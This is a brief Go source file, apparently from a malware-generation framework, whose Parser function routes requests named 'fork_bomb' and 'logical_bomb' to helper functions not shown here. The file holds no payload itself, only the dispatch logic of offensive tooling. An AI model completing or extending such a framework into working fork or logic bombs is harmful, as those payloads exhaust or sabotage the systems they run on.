package bombs

import (
	"fmt"

	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

//
//
// The main parser for the Infect domain
//
//
func Parser(function string, value string, s_json string) ([]string, string) {
	call := []string{}

	switch function {
	case "fork_bomb":
		call, s_json = fork_bomb(value, s_json)

	case "logical_bomb":
		call, s_json = logical_bomb(value, s_json)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "bombs.Parser()")

	}

	return call, s_json
}
